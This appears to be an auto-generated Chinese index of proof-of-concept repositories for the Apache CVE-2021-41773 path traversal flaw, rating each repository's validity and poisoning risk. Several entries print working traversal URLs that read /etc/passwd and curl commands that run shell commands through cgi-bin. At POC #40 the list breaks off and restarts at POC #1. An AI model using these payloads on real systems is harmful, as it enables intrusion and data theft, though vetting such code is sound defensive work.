4. **payload构造:** 首先构造畸形的URL, 包含`/.%2e/%2e%2e/` 序列, 并指定到系统程序`/bin/sh`, 通过`POST`方法,将需要执行的代码注入到`DATA`变量中.

**总结：**
CVE-2021-41773 是一个严重的安全漏洞，可以被利用进行路径遍历和远程代码执行。提供的 POC 代码可以有效利用此漏洞，但是务必在授权的情况下进行测试。代码本身投毒风险较低，但成功利用漏洞后的风险极高。

**项目地址:** [mah4nzfr/CVE-2021-41773](https://github.com/mah4nzfr/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #34

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773-PoC.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773-PoC.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致文件泄露，甚至远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，且Alias配置的目录未启用 "require all denied" 保护，CGI脚本需要启用。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的路径遍历漏洞。攻击者可以利用该漏洞，通过构造包含特殊字符的URL，绕过Alias指令的限制，访问服务器上未授权的文件。如果目标服务器同时启用了CGI脚本支持，则攻击者可能进一步利用此漏洞执行任意代码。

**有效性：**

根据漏洞库信息、搜索结果和漏洞利用代码，可以判断该漏洞的POC代码是有效的。漏洞库中明确指出此漏洞已被在野利用。搜索引擎结果也显示了POC的存在和利用方式。

**投毒风险：**

提供的Dockerfile中，核心操作是：

1.  `FROM httpd:2.4.49`:  指定基础镜像为httpd:2.4.49，这是一个官方镜像，降低了投毒的可能性。
2.  `RUN sed -i 's/Require all denied/# Require all denied/g' /usr/local/apache2/conf/httpd.conf`:  这行代码将httpd.conf文件中的`Require all denied`注释掉。这正是为了使漏洞更容易被利用。如果没有这一行，即使存在路径遍历，也无法读取到未授权的文件（因为默认是拒绝所有访问）。这部分不是投毒，而是为了方便漏洞验证。
其他文件是`LICENSE`，仅包含Apache License 2.0的文本，不涉及任何恶意代码。

因此，直接的恶意投毒代码的可能性较低，但该Dockerfile的意图是创造一个存在漏洞的环境，以便更容易地利用漏洞。该仓库本身并没有主动植入恶意代码，而是提供了一个方便利用漏洞的环境。考虑到该行为可能被恶意利用，判定存在10%的投毒风险，因为此Dockerfile的目的是为了移除安全防护，为攻击者降低利用门槛。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含`..%2f`的URL，尝试访问受限目录之外的文件。`%2f`是`/`的URL编码，`..`表示上一级目录。多次使用`..%2f`可以突破目录限制。
2.  **文件读取：** 如果成功绕过限制，攻击者可以读取服务器上的任意文件，例如配置文件、源代码等。
3.  **远程代码执行 (RCE)：** 如果目标服务器启用了CGI，攻击者可以通过上传恶意CGI脚本并执行，实现远程代码执行。利用路径遍历，将请求发送到位于服务器文件系统上的CGI脚本，从而执行任意命令。

例如，攻击者可以使用如下URL读取`/etc/passwd`文件：

`http://target/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd`

如果启用了CGI，攻击者可以尝试利用路径遍历访问并执行CGI脚本，例如：

`http://target/cgi-bin/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fpath/to/malicious.cgi`

**项目地址:** [mightysai1997/CVE-2021-41773-PoC](https://github.com/mightysai1997/CVE-2021-41773-PoC)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #35

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773-i-.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773-i-.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致敏感信息泄露或远程代码执行 (取决于配置)

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行 Apache HTTP Server 2.4.49，且 Alias 指令配置不当或 CGI 脚本启用。需要可以发送 HTTP 请求的网络访问。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中存在的一个路径遍历漏洞。该漏洞源于 Apache HTTP Server 在路径规范化方面存在缺陷，攻击者可以利用该漏洞将 URL 映射到 Alias 指令配置目录之外的文件。如果这些目录之外的文件没有受到 "require all denied" 等默认配置的保护，请求就可以成功。如果为这些 Aliased 路径启用了 CGI 脚本，则可能导致远程代码执行。

**漏洞利用方式：**

攻击者通过构造包含特殊编码（如 `%2e`）的路径的 HTTP 请求，绕过 Apache HTTP Server 的路径检查，从而访问受限目录之外的文件。例如，`GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1` 这样的请求可以尝试读取服务器上的 `/etc/passwd` 文件。

根据提供的 Dockerfile 和 README.md，PoC 的有效性依赖于两个关键步骤：

1.  **Dockerfile:** 使用 `httpd:2.4.49` 镜像，确保存在漏洞的 Apache 版本。
2.  **httpd.conf:**  修改 `httpd.conf` 文件，将 `<Directory />` 部分的 `Require all denied` 更改为 `Require all granted`。这一步**至关重要**，因为 `Require all denied` 配置会阻止对根目录的访问，从而阻止漏洞利用。如果未修改此配置，即使存在漏洞，也无法读取文件。

**投毒风险分析：**

分析提供的 Dockerfile 和 httpd.conf 文件，发现投毒代码的风险较低，估计为 5%。主要风险在于以下可能性：

*   **`httpd.conf` 修改的误导性:**  虽然 README.md 中明确说明了修改 `Require all denied` 的原因，但如果用户盲目复制粘贴配置文件，可能会在无意中降低服务器的安全性。
*   **CGI脚本的滥用:** 虽然PoC本身不包含恶意CGI脚本，但如果服务器上存在未授权或存在漏洞的CGI脚本，攻击者可能会利用该漏洞执行恶意代码。

总体来说，该 PoC 主要用于演示漏洞，但使用者应该意识到其潜在的安全风险。

**项目地址:** [mightysai1997/CVE-2021-41773-i-](https://github.com/mightysai1997/CVE-2021-41773-i-)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #36

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773S.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773S.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 & 远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未授权的攻击者访问敏感信息，甚至执行任意代码。

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且配置允许CGI脚本执行或者存在Alias-like指令的配置。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中存在的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造特殊的 URL，绕过 Alias-like 指令的限制，访问服务器上受限目录之外的文件。如果服务器同时启用了 CGI 脚本执行，攻击者还可以通过该漏洞执行任意代码。

**有效性：**

提供的 PoC 代码是有效的。通过发送包含 URL 编码的路径遍历字符的 HTTP 请求，可以读取`/etc/passwd`等敏感文件，或者如果启用了 CGI，则可以执行系统命令。

例如，使用 `curl http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd` 可以尝试读取`/etc/passwd`文件。
如果服务器配置允许 CGI 执行，使用 `curl 'localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'A=|echo;id'` 可以在服务器上执行 `id` 命令。

**投毒风险：**

查看提供的 Dockerfile 和 httpd.conf 文件，未发现明显的恶意代码。`blueteamsteve` 提供的 Docker 镜像配置目的是为了复现漏洞，使得利用更加方便。虽然代码本身没有恶意，但如果攻击者修改 Dockerfile 或者 httpd.conf 文件，加入恶意代码并重新构建镜像，可能会存在投毒风险。从现有信息判断，代码本身投毒风险极低，给出1%的概率。 

**利用方式：**

1.  **路径遍历：** 攻击者通过构造包含`/.%2e/.%2e/`的特殊 URL，尝试访问服务器上的任意文件。`%2e` 是`.`的 URL 编码，用于绕过某些安全限制。
2.  **远程代码执行（RCE）：** 如果服务器启用了 CGI 脚本，攻击者可以通过路径遍历访问到 `/bin/sh` 等 shell 程序，并执行任意命令。

为了成功利用该漏洞，目标服务器需要满足以下条件：

*   运行 Apache HTTP Server 2.4.49 版本。
*   服务器的配置存在 Alias-like 指令，且对受限目录之外的文件没有进行严格的访问控制。
*   可选：服务器启用了 CGI 脚本执行。

**项目地址:** [mightysai1997/CVE-2021-41773S](https://github.com/mightysai1997/CVE-2021-41773S)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #37

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773h.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773h.md)

## CVE-2021-41773-Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行受影响的 Apache HTTP Server 版本，并且 Alias 指令配置不当，允许访问受限目录之外的文件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造包含特殊字符的 URL，绕过 Alias 指令的限制，访问服务器上未授权的文件。如果服务器配置允许 CGI 脚本在这些 aliased 路径下执行，则攻击者可能进一步实现远程代码执行。

**有效性分析：**

根据漏洞库信息和搜索结果，CVE-2021-41773 在野外已被利用。提供的 Dockerfile 使用了 `httpd:2.4.49-alpine` 镜像，明确指定了受影响的 Apache 版本。Dockerfile 下载并替换了默认的 `httpd.conf` 配置文件。如果这个 `httpd.conf` 配置不安全，例如没有正确的 `Require all denied` 规则，那么漏洞利用将是有效的。综上所述，该POC的有效性较高，但依赖于 `httpd.conf` 的具体内容。

**投毒风险分析：**

提供的文件列表中，`LICENSE` 文件是标准的 Apache 许可证，没有投毒风险。Dockerfile本身只包含下载配置文件和替换配置文件的操作。投毒风险主要在于从 `https://raw.githubusercontent.com/itsecurityco/CVE-2021-41773/main/httpd.conf` 下载的 `httpd.conf` 文件。攻击者可能会修改该文件，例如：

*   **放宽访问限制：**  允许访问敏感目录，例如 `/var/www/html` 之外的目录。
*   **配置恶意 CGI 脚本：**  允许执行任意代码。
*   **植入后门：**  在配置文件中添加恶意指令，例如通过 mod_rewrite 实现后门访问。

由于无法直接分析远程 `httpd.conf` 文件的内容，因此存在一定的投毒风险。 这里估计投毒风险为 10%，因为该项目看起来是为了演示漏洞，不太可能包含恶意代码，但仍然需要谨慎。

**利用方式分析：**

利用方式主要通过构造恶意的 HTTP GET 请求，其中包含经过 URL 编码的路径遍历字符。例如，可以使用 `%2e%2e/` 或 `%252e%252e/` 来绕过路径规范化，访问目标目录之外的文件。

例如，如果目标服务器存在以下 Alias 配置：

```
Alias /images /var/www/images
```

攻击者可以使用以下 URL 访问 `/etc/passwd` 文件：

```
GET /images/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
```

如果 CGI 脚本已启用，则可以构造包含恶意代码的 CGI 脚本，并通过路径遍历漏洞执行它，从而实现远程代码执行。

**项目地址:** [mightysai1997/CVE-2021-41773h](https://github.com/mightysai1997/CVE-2021-41773h)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #38

**来源**: [CVE-2021-41773-psibot_apache-vulnerable.md](../2021/CVE-2021-41773-psibot_apache-vulnerable.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal 和 RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal, Remote Code Execution (RCE)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49 或 2.4.50，且配置允许CGI脚本执行，部分Alias目录未进行 require all denied 限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中，是一个路径遍历漏洞。攻击者可以通过构造包含恶意路径的URL，绕过 Alias 指令配置的目录限制，访问服务器上的任意文件，如果目标开启了CGI支持，攻击者可以通过构造恶意请求执行任意代码。该漏洞利用的关键在于路径规范化处理的缺陷，允许攻击者使用 `/.%2e` 绕过限制。

**有效性：**
根据漏洞描述和提供的漏洞利用代码，可以判定该POC代码是有效的。漏洞库信息、搜索引擎结果和漏洞利用代码都确认了该漏洞的存在以及利用方式。Nuclei模板可以用来检测目标服务器是否存在漏洞，而curl命令的POC则直接利用了路径遍历读取 `/etc/passwd` 文件。

**投毒风险：**
提供的代码仓库主要包含Nuclei的YAML模板文件和一个README.md文件。Nuclei模板主要用于漏洞检测，本身不具备直接植入后门的能力。投毒风险主要集中在以下几个方面：
1.  **模板逻辑修改：** 攻击者可能修改模板的匹配规则，使得原本不存在漏洞的服务器也被误判为存在漏洞，从而误导用户进行后续操作。
2.  **模板Payload替换：**  攻击者可能在模板中替换恶意的payload，例如，将读取`/etc/passwd` 替换为执行恶意命令的payload。但提供的模板中直接包含RCE利用，风险相对较小
3.  **依赖库劫持：** 虽然Nuclei本身是安全的，但如果用户使用的Nuclei版本存在依赖库劫持的风险，攻击者可能通过替换Nuclei的依赖库来执行恶意代码。但此风险与本仓库代码关系不大。

因此，综合考虑，该仓库存在一定的投毒风险，但主要集中在Nuclei模板的修改上，而不是直接包含恶意代码。 风险占比10%。

**利用方式：**
1.  **路径遍历（文件读取）：** 攻击者构造包含 `/.%2e/%2e%2e/%2e%2e/%2e%2e/` 序列的URL，尝试读取服务器上的任意文件，例如 `/etc/passwd`。
2.  **远程代码执行 (RCE)：**  如果服务器启用了CGI，攻击者可以通过路径遍历访问到CGI脚本，并通过构造特殊的请求来执行任意命令。具体方法通常依赖于服务器的具体配置和CGI脚本的编写方式。

**项目地址:** [psibot/apache-vulnerable](https://github.com/psibot/apache-vulnerable)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #39

**来源**: [CVE-2021-41773-r0otk3r_CVE-2021-41773.md](../2021/CVE-2021-41773-r0otk3r_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50 (CVE-2021-42013是对CVE-2021-41773的不完全修复)

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，可能需要CGI模块启用，以及Alias配置不当。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造特殊的URL，绕过Alias等指令的限制，访问服务器上的任意文件。如果服务器同时启用了CGI，则可能进一步导致远程代码执行。漏洞利用代码`exploit.py`提供LFI(本地文件包含)和RCE(远程代码执行)两种攻击模式。LFI模式通过构造包含`/.%2e`序列的URL，读取服务器上的文件。RCE模式利用CGI执行命令，通过POST请求发送包含命令的Payload。

**漏洞利用方式：**

1.  **路径遍历 (LFI)：** 攻击者构造包含`/.%2e/%2e%2e`序列的URL，尝试访问受限目录之外的文件，例如`/etc/passwd`。  该漏洞利用代码中的payload1和payload2就是用于此目的，通过拼接路径来尝试读取目标文件。
2.  **远程代码执行 (RCE)：** 如果目标服务器启用了CGI，攻击者可以利用路径遍历漏洞，访问CGI脚本目录，并通过POST请求执行任意命令。漏洞利用代码中的payload3就是用于指定CGI脚本的位置，然后通过构造POST请求，在data中包含要执行的命令。

**关于投毒风险：**
该漏洞利用代码 `exploit.py` 本身看起来比较直接，目的是利用该漏洞。存在投毒的可能性较低，但仍不能完全排除，比如作者可以在交互式shell部分加入一些后门代码,或者在payload中加入恶意指令。经过分析，判断存在10%的投毒风险。`README.md`文件看起来也比较标准，风险较低。

**搜索引擎结果：**
搜索引擎结果表明该漏洞确实存在，且已被广泛利用。多个文章指出该漏洞可以导致敏感信息泄露和远程代码执行。

**项目地址:** [r0otk3r/CVE-2021-41773](https://github.com/r0otk3r/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #40

**来源**: [CVE-2021-41773-redspy-sec_CVE-2021-41773.md](../2021/CVE-2021-41773-redspy-sec_CVE-2021-41773.md)

# CVE-2021-41773

> 📦 该CVE有 **43** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-41773-0xGabe_Apache-CVEs.md](../2021/CVE-2021-41773-0xGabe_Apache-CVEs.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并且CGI脚本已启用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中存在的路径遍历漏洞。攻击者可以利用此漏洞，通过构造包含特殊字符（如 `%2e`，即 URL 编码的点 `.`）的恶意 URL，绕过服务器配置的 Alias 指令限制，访问服务器上受限目录之外的文件。如果目标服务器同时启用了 CGI 脚本的执行，攻击者还可以通过类似的路径遍历方式，执行任意命令。

**有效性评估：**

根据漏洞描述、搜索引擎结果和提供的 POC 代码，可以判定此漏洞的 POC 代码具有较高的有效性。漏洞库信息明确指出此漏洞已被在野利用，搜索引擎结果也提供了相关的利用案例和分析。POC 代码 `cve-2021-41773.py` 提供了路径遍历读取文件以及远程命令执行两种利用方式，并对 Apache 服务器版本进行了简单的指纹识别。

**投毒风险评估：**

分析提供的 POC 代码，`LICENSE` 文件采用标准的 MIT 许可，`README.md` 文件描述了漏洞和利用方法，`cve-2021-41773.py` 文件实现了漏洞利用。代码逻辑相对简单，主要利用 `urllib` 和 `requests` 库发送 HTTP 请求，没有发现明显的恶意代码或者后门。存在极低的投毒风险，例如细微的编码错误或依赖项问题，因此评估投毒风险为 5%。

**利用方式分析：**

利用方式主要有两种：

1.  **路径遍历文件读取：** 攻击者构造包含 URL 编码的路径遍历字符的 URL，例如 `/.%2e/.%2e/.%2e/.%2e/etc/passwd`，尝试读取服务器上的敏感文件。POC 代码中的 `pathTraversal` 函数实现了该功能。

2.  **远程命令执行：**  攻击者利用路径遍历漏洞访问 CGI 脚本目录，并向该目录下的 `sh` (或其他 shell 解释器) 传递要执行的命令。POC 代码中的 `remoteCommandExecution` 函数模拟了这一过程，构造包含命令的 POST 请求，发送到目标服务器。注意，利用此方法需要目标服务器配置允许执行 CGI 脚本。

**项目地址:** [0xGabe/Apache-CVEs](https://github.com/0xGabe/Apache-CVEs)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #2

**来源**: [CVE-2021-41773-0xc4t_CVE-2021-41773.md](../2021/CVE-2021-41773-0xc4t_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且CGI脚本已启用

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中存在的一个路径遍历漏洞。攻击者可以通过构造包含特殊字符（如 URL 编码的 '..', 即 '%2e' 或 '%32%65'）的恶意 URL，绕过 Alias-like 指令配置的目录限制，访问服务器上的任意文件。如果服务器配置允许 CGI 脚本执行，攻击者还可以利用该漏洞执行任意代码。

**利用方式：**

1.  **路径遍历（LFI）:** 攻击者可以使用包含编码后的 '..' 序列的 URL 来访问服务器上的敏感文件，例如 `/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd`。
2.  **远程代码执行（RCE）:** 如果目标服务器的 `/cgi-bin/` 目录启用了 CGI 脚本执行，攻击者可以通过上传恶意脚本并使用路径遍历漏洞来执行它们，例如 `curl 'http://localhost:81/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type: text/plain; echo; whoami'`。

**有效性：**

根据漏洞库信息和搜索结果，提供的 POC 代码是有效的。漏洞库信息中明确指出此漏洞已被在野利用，搜索结果中也提供了大量关于该漏洞的分析和利用方法，POC可以复现LFI和RCE。

**投毒风险：**

此仓库存在轻微的投毒风险（5%），因为攻击者可能会修改 Dockerfile 或 httpd.conf 文件，例如添加恶意的反弹shell脚本到CGI目录，或修改httpd.conf 允许所有目录可访问。 正常的POC验证不会有这种行为, 但是总体上，该仓库主要用于漏洞演示和利用，恶意代码的可能性较低，用户在搭建环境和使用POC时，应该注意检查 Dockerfile 和 httpd.conf 文件。

**项目地址:** [0xc4t/CVE-2021-41773](https://github.com/0xc4t/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #3

**来源**: [CVE-2021-41773-Ask-os_CVE-2021-41773.md](../2021/CVE-2021-41773-Ask-os_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal 和 RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** mod_cgi 必须启用，目标服务器运行 Apache HTTP Server 2.4.49 且相关目录未配置 "require all denied"

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中的一个路径遍历漏洞。该漏洞源于 Apache HTTP Server 在处理 URL 路径时存在缺陷，攻击者可以利用 `/.%2e/` 序列绕过路径规范化检查，从而访问受限目录之外的文件。如果服务器配置允许执行 CGI 脚本，攻击者可以通过构造包含恶意命令的 HTTP 请求执行任意代码，导致远程代码执行（RCE）。

**有效性：**
提供的 POC 代码 (`CVE-2021-42013.py`) 旨在利用此漏洞。它通过 `curl` 命令发送包含路径遍历序列和 shell 命令的 HTTP 请求，从而在目标服务器上执行命令。`README.md` 文件描述了漏洞细节和利用方法，包括依赖项（Python 3 和 `curl`），执行命令的示例，增强了漏洞利用的有效性。

**投毒风险：**
虽然提供的代码旨在利用漏洞，但仍存在轻微的投毒风险的可能性。例如，`README.md` 中可能存在误导信息，导致用户以非预期的方式使用该脚本，或者脚本本身可能包含某些不明显或未记录的功能，但考虑到作者主要目的是复现该漏洞，以及代码整体比较简单，所以推测投毒的可能性为10%。 

**利用方式：**
1.  **路径遍历：** 攻击者利用 URL 中的 `/.%2e/` 序列，尝试访问服务器文件系统上的任意文件。
2.  **CGI 脚本执行：** 如果目标服务器启用了 `mod_cgi` 模块，攻击者可以构造包含恶意命令的 HTTP 请求，并将其发送到 CGI 脚本处理程序。
3.  **远程代码执行：** 服务器执行 CGI 脚本时，会执行攻击者提供的命令，从而实现远程代码执行。

**项目地址:** [Ask-os/CVE-2021-41773](https://github.com/Ask-os/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #4

**来源**: [CVE-2021-41773-CyberQuestor-infosec_CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE.md](../2021/CVE-2021-41773-CyberQuestor-infosec_CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE.md)

## CVE-2021-41773 – Apache HTTP Server 2.4.49 远程代码执行

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历导致远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未授权的攻击者读取任意文件并执行任意代码

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache 2.4.49，并且开启了CGI支持，对Alias配置的目录没有做严格的权限限制（例如 require all denied）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，由于对路径规范化处理不当导致。攻击者可以利用 `%2e` 等编码字符进行路径遍历攻击，访问受限目录之外的文件。如果服务器启用了 CGI，则可以通过构造包含恶意命令的 HTTP 请求来执行任意代码。

**漏洞利用方式：**

1.  **路径遍历：** 利用 `/.%2e` 序列绕过路径检查，访问受限目录之外的文件。
2.  **CGI 执行：** 访问 `cgi-bin` 目录下的文件（或其他配置为 CGI 处理的目录），并在 POST 数据中注入命令，让服务器执行。
3.  **远程代码执行：** 通过执行 `/bin/bash` 或其他 shell 程序，执行任意系统命令。

**POC有效性：**

根据漏洞库信息、搜索结果和提供的漏洞利用代码（README.md），该POC代码是有效的。漏洞库信息明确指出该漏洞已在野外被利用，搜索结果也证实了这一点。提供的 README.md 详细描述了漏洞的原理、利用方法和演示，并给出了可用的 `curl` 命令示例。

**投毒风险分析：**

分析提供的 README.md 文件， 其中包含的curl命令，本质上是利用漏洞执行bash命令，这个本身是漏洞利用的正常方式，不能算作投毒行为，图片文件没有发现可疑代码.

虽然直接可识别的投毒代码的可能性较低，但仍存在以下潜在风险：

*   **依赖性风险：** 如果 exploit 依赖于外部资源（例如，下载脚本或库），则这些资源可能被篡改，从而引入恶意代码。
*   **隐蔽的 Payload：** 恶意代码可能隐藏在看似无害的注释、变量名或字符串中，需要更深入的代码分析才能发现。
*   **误导性信息：** README.md 文件中的信息可能具有误导性，导致使用者在不知情的情况下执行恶意操作。

综合以上因素，我估计存在10%的投毒风险，主要是考虑到潜在的隐蔽Payload和对外部资源的依赖风险。

为了降低风险，建议：

*   仔细审查所有代码，包括注释和变量名。
*   在隔离的环境中运行 POC 代码。
*   使用最新的安全工具检测潜在的恶意代码。
*   关注与此漏洞相关的安全信息和更新。

**项目地址:** [CyberQuestor-infosec/CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE](https://github.com/CyberQuestor-infosec/CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #5

**来源**: [CVE-2021-41773-FakesiteSecurity_CVE-2021-41773.md](../2021/CVE-2021-41773-FakesiteSecurity_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal / Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** Apache HTTP Server 版本为2.4.49，并且存在Alias-like指令配置，且这些目录下的文件未被"require all denied"保护，CGI脚本被启用。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞信息和搜索结果，CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，如果配置不当，可能导致远程代码执行。

**有效性：**

提供的POC代码（`cve-2021-41773.py`, `cve-2021-41773_RCE.py`, `cve-2021-41773_manual.py`）旨在利用此漏洞。 `cve-2021-41773.py` 尝试读取 `/etc/passwd` 文件以验证漏洞的存在。`cve-2021-41773_RCE.py` 尝试通过 CGI 脚本执行命令。

根据搜索结果，该漏洞在野外被积极利用，因此，提供的POC代码很可能有效，但成功利用取决于目标服务器的配置。

**投毒风险：**

审查提供的POC代码，没有发现明显的恶意代码或后门。代码的功能是扫描目标是否存在漏洞，并尝试利用漏洞读取文件或执行命令。`cve-2021-41773.py`的第49行给出了可以添加常见目录的提示，但本身不具备投毒性。

**利用方式：**

1.  **路径遍历：** 攻击者使用特殊的 URL 编码序列（例如 `/.%2e/%2e%2e/`）来绕过路径规范化，从而访问 Alias-like 指令配置目录之外的文件。
2.  **文件读取：** 如果目标文件没有被 "require all denied" 保护，攻击者可以读取任意文件，例如 `/etc/passwd`，从而获取敏感信息。
3.  **远程代码执行：** 如果 CGI 脚本被启用，攻击者可以通过构造恶意的 URL 和 POST 数据来执行任意代码。例如，`cve-2021-41773_RCE.py` 使用 `/cgi-bin/` 目录，并尝试执行 `uname` 命令。

总而言之，此漏洞的利用需要特定的配置条件，但如果满足条件，则风险非常高。

**项目地址:** [FakesiteSecurity/CVE-2021-41773](https://github.com/FakesiteSecurity/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #6

**来源**: [CVE-2021-41773-Iris288_CVE-2021-41773.md](../2021/CVE-2021-41773-Iris288_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal & Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未经身份验证的攻击者读取任意文件和执行任意代码。

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且存在Alias-like指令配置不当，CGI脚本已启用，且文件系统权限配置不当，未启用'require all denied'。

**POC 可用性:** 是

**投毒风险:** 0%

